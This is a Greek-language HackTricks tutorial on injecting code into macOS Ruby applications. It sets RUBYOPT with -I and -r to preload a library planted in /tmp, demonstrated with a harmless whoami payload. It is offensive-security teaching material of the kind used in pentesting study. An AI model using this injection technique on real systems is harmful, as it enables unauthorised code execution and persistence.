# Εισαγωγή σε εφαρμογές Ruby στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## RUBYOPT

Χρησιμοποιώντας αυτήν τη μεταβλητή περιβάλλοντος, είναι δυνατόν να **προστεθούν νέες παράμετροι** στο **ruby** κάθε φορά που εκτελείται. Αν και η παράμετρος **`-e`** δεν μπορεί να χρησιμοποιηθεί για να καθορίσει κώδικα ruby προς εκτέλεση, είναι δυνατόν να χρησιμοποιηθούν οι παράμετροι **`-I`** και **`-r`** για να προστεθεί ένας νέος φάκελος στη διαδρομή φόρτωσης των βιβλιοθηκών και στη συνέχεια να καθοριστεί μια βιβλιοθήκη για φόρτωση.

Δημιουργήστε τη βιβλιοθήκη **`inject.rb`** στο **`/tmp`**:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

Δημιουργήστε οπουδήποτε ένα ruby script όπως:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

Στη συνέχεια, δημιουργήστε ένα αυθαίρετο ruby script και φορτώστε το με:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ενδιαφέρον γεγονός, λειτουργεί ακόμα και με την παράμετρο **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
